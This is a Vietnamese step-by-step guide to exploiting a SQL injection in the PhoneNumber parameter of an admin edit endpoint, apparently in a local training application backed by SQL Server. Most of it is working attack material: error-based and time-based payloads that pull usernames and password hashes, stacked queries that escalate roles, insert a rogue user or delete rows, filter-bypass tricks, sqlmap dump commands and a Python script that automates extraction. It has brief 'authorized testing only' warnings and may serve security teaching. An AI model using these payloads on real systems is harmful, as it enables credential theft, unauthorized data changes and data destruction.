# Hướng dẫn khai thác SQL Injection - PhoneNumber Parameter

## Endpoint: POST /Admin/Edit/{id}
**Parameter vulnerable:** `PhoneNumber`  
**SQL Query:** `UPDATE Users SET PhoneNumber = '{phoneNumber}' WHERE Id = {userId}`  
**Database:** SQL Server

---

## ⚠️ LƯU Ý QUAN TRỌNG

1. **Cần đăng nhập với quyền Admin** để truy cập endpoint này
2. **CSRF Token:** Form có CSRF protection, cần include `__RequestVerificationToken` khi gửi request
3. **SQL Server:** Sử dụng syntax của SQL Server (T-SQL)
4. **UPDATE Statement:** Đây là UPDATE query, không phải SELECT, nên UNION injection sẽ khó khăn hơn

---

## Bước 1: Xác nhận lỗ hổng SQL Injection

### 1.1. Test cơ bản với dấu nháy đơn (')
```
PhoneNumber: '
```

**Kết quả mong đợi:**
- HTTP Status: **500 Internal Server Error**
- Response chứa: "⚠️ SQL INJECTION DETECTED!"
- SQL Error: "Incorrect syntax near '''"
- SQL Query được hiển thị: `UPDATE Users SET PhoneNumber = ''' WHERE Id = {id}`

### 1.2. Test với comment (đóng câu lệnh)
```
PhoneNumber: '--
```

**Kết quả:** Nếu thành công, câu lệnh UPDATE sẽ được đóng và không có lỗi.

---

## Bước 2: Error-based SQL Injection (Lấy dữ liệu qua Error Messages)

Vì đây là UPDATE statement, ta có thể sử dụng Error-based SQL Injection để lấy dữ liệu thông qua error messages.

### 2.1. Lấy version của SQL Server
```
PhoneNumber: ' AND 1=CONVERT(int, @@version)--
```

**Giải thích:** 
- `CONVERT(int, @@version)` sẽ fail vì @@version là string
- Error message sẽ chứa version của SQL Server

### 2.2. Lấy tên database hiện tại
```
PhoneNumber: ' AND 1=CONVERT(int, DB_NAME())--
```

### 2.3. Lấy username đầu tiên từ bảng Users
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT TOP 1 Username FROM Users))--
```

**Kết quả:** Error message sẽ chứa username đầu tiên

### 2.4. Lấy username của user cụ thể (ví dụ: Id=1)
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT Username FROM Users WHERE Id=1))--
```

### 2.5. Lấy password hash
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT PasswordHash FROM Users WHERE Id=1))--
```

### 2.6. Lấy tất cả username (sử dụng FOR XML PATH)
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT Username + ',' FROM Users FOR XML PATH('')))--
```

### 2.7. Lấy tên các bảng trong database
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
```

Để lấy tất cả tables:
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT table_name + ',' FROM information_schema.tables FOR XML PATH('')))--
```

### 2.8. Lấy tên các cột của bảng Users
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='Users'))--
```

Lấy tất cả columns:
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT column_name + ',' FROM information_schema.columns WHERE table_name='Users' FOR XML PATH('')))--
```

---

## Bước 3: Time-based Blind SQL Injection

Sử dụng khi không thể lấy dữ liệu qua error messages.

### 3.1. Xác nhận SQL Injection với time delay
```
PhoneNumber: '; WAITFOR DELAY '00:00:05'--
```

**Kết quả:** Response sẽ bị delay 5 giây → Xác nhận SQL injection

### 3.2. Kiểm tra điều kiện (Boolean-based)
```
PhoneNumber: '; IF (1=1) WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--
```

Nếu delay 5 giây → điều kiện đúng

### 3.3. Kiểm tra username tồn tại
```
PhoneNumber: '; IF (EXISTS(SELECT * FROM Users WHERE Username='admin')) WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--
```

### 3.4. Lấy độ dài của password hash
```
PhoneNumber: '; IF (LEN((SELECT PasswordHash FROM Users WHERE Id=1))>50) WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--
```

### 3.5. Lấy từng ký tự của password hash (Brute force)
```
PhoneNumber: '; IF (SUBSTRING((SELECT PasswordHash FROM Users WHERE Id=1), 1, 1)='$') WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--
```

Thay `$` bằng các ký tự để brute force.

---

## Bước 4: Stacked Queries (Nếu được hỗ trợ)

### 4.1. Thực thi nhiều câu lệnh SQL
```
PhoneNumber: '; UPDATE Users SET Role=0 WHERE Id=1;--
```

### 4.2. Chèn dữ liệu vào bảng khác
```
PhoneNumber: '; INSERT INTO Users (Username, PasswordHash, FullName, Role) VALUES ('hacker', 'hash', 'Hacker', 0);--
```

### 4.3. Xóa dữ liệu
```
PhoneNumber: '; DELETE FROM Users WHERE Id=2;--
```

⚠️ **CẢNH BÁO:** Chỉ test trên môi trường được phép!

---

## Bước 5: Khai thác thực tế với Burp Suite

### 5.1. Capture request với Burp Proxy

1. Bật Burp Proxy
2. Đăng nhập với quyền Admin
3. Vào `/Admin/Detail/{id}`, click Edit
4. Nhập payload vào PhoneNumber
5. Submit form
6. Request sẽ được capture trong Burp

### 5.2. Request mẫu (Raw HTTP)

```http
POST /Admin/Edit/1003 HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Cookie: access_token=YOUR_JWT_TOKEN
Content-Length: 234

Id=1003&FullName=Test User&PhoneNumber=' AND 1=CONVERT(int, (SELECT TOP 1 Username FROM Users))--&Address=Test&Role=Student&__RequestVerificationToken=TOKEN_HERE
```

### 5.3. Sử dụng Burp Repeater

1. Send request đến Repeater
2. Thay đổi payload trong `PhoneNumber`
3. Send và xem response
4. Tìm error message chứa dữ liệu

### 5.4. Sử dụng Burp Intruder để brute force

**Payload position:**
```
PhoneNumber=' AND 1=CONVERT(int, (SELECT SUBSTRING(PasswordHash, §1§, 1) FROM Users WHERE Id=1))--
```

**Payload set:** Ký tự từ a-z, A-Z, 0-9, và các ký tự đặc biệt

---

## Bước 6: Khai thác với SQLMap

### 6.1. Cơ bản
```bash
sqlmap -u "http://localhost:5000/Admin/Edit/1003" \
  --data="Id=1003&FullName=Test&PhoneNumber=*&Address=Test&Role=Student&__RequestVerificationToken=TOKEN" \
  -p PhoneNumber \
  --cookie="access_token=YOUR_JWT_TOKEN" \
  --batch
```

### 6.2. Lấy danh sách databases
```bash
sqlmap -u "http://localhost:5000/Admin/Edit/1003" \
  --data="PhoneNumber=*" \
  -p PhoneNumber \
  --dbs \
  --batch
```

### 6.3. Lấy danh sách tables
```bash
sqlmap -u "http://localhost:5000/Admin/Edit/1003" \
  --data="PhoneNumber=*" \
  -p PhoneNumber \
  -D ExamDB \
  --tables \
  --batch
```

### 6.4. Dump dữ liệu từ bảng Users
```bash
sqlmap -u "http://localhost:5000/Admin/Edit/1003" \
  --data="PhoneNumber=*" \
  -p PhoneNumber \
  -D ExamDB \
  -T Users \
  --dump \
  --batch
```

---

## Bước 7: Payloads thực tế để khai thác

### 7.1. Lấy tất cả username
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT Username + CHAR(10) FROM Users FOR XML PATH('')))--
```

### 7.2. Lấy username và password hash
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT Username + ':' + PasswordHash + CHAR(10) FROM Users FOR XML PATH('')))--
```

### 7.3. Lấy thông tin user có quyền Admin
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT Username FROM Users WHERE Role=0))--
```

### 7.4. Lấy thông tin về cấu trúc database
```
PhoneNumber: ' AND 1=CONVERT(int, (SELECT table_name + ':' + column_name + CHAR(10) FROM information_schema.columns FOR XML PATH('')))--
```

---

## Bước 8: Bypass các biện pháp bảo vệ (nếu có)

### 8.1. Bypass filter dấu nháy đơn (nếu bị filter)
```
PhoneNumber: CHAR(39)  -- Thay cho dấu nháy đơn
```

### 8.2. Bypass filter khoảng trắng
```
PhoneNumber: '/**/AND/**/1=1--
```

### 8.3. Bypass filter comment
```
PhoneNumber: ' OR '1'='1' OR '1'='1
```

---

## Bước 9: Script tự động khai thác (Python)

```python
import requests
import re

def exploit_sqli(user_id, payload):
    url = f"http://localhost:5000/Admin/Edit/{user_id}"
    
    # Lấy CSRF token và session
    session = requests.Session()
    login_response = session.post("http://localhost:5000/Auth/Login", 
                                  data={"Username": "admin", "Password": "admin"})
    
    # Lấy detail page để lấy CSRF token
    detail_response = session.get(f"http://localhost:5000/Admin/Detail/{user_id}")
    csrf_token = re.search(r'name="__RequestVerificationToken" value="([^"]+)"', 
                           detail_response.text).group(1)
    
    # Gửi payload
    data = {
        "Id": user_id,
        "FullName": "Test",
        "PhoneNumber": payload,
        "Address": "Test",
        "Role": "Student",
        "__RequestVerificationToken": csrf_token
    }
    
    response = session.post(url, data=data)
    
    # Extract dữ liệu từ error message
    if "SQL INJECTION DETECTED" in response.text:
        # Parse error để lấy dữ liệu
        match = re.search(r'SQL Server Error:.*?([A-Za-z0-9_]+)', response.text)
        if match:
            return match.group(1)
    
    return None

# Sử dụng
username = exploit_sqli(1003, "' AND 1=CONVERT(int, (SELECT TOP 1 Username FROM Users))--")
print(f"Username: {username}")
```

---

## Tổng kết các kỹ thuật

1. **Error-based SQL Injection:** ✅ Hiệu quả nhất - Lấy dữ liệu qua error messages
2. **Time-based Blind SQL Injection:** ✅ Hoạt động tốt - Cần thời gian để brute force
3. **Boolean-based Blind SQL Injection:** ✅ Hoạt động - Kết hợp với time delay
4. **Stacked Queries:** ⚠️ Phụ thuộc vào cấu hình database
5. **Union-based:** ❌ Không phù hợp với UPDATE statement

---

## Lưu ý bảo mật

⚠️ **CHỈ TEST TRÊN MÔI TRƯỜNG ĐƯỢC PHÉP!**

- Không khai thác trên hệ thống production
- Không thực hiện các thao tác phá hoại (DELETE, DROP TABLE, etc.)
- Báo cáo lỗ hổng cho team phát triển
- Sử dụng các kỹ thuật này để hiểu và fix lỗ hổng

---

## Tài liệu tham khảo

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Server T-SQL Reference](https://docs.microsoft.com/en-us/sql/t-sql/language-reference)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
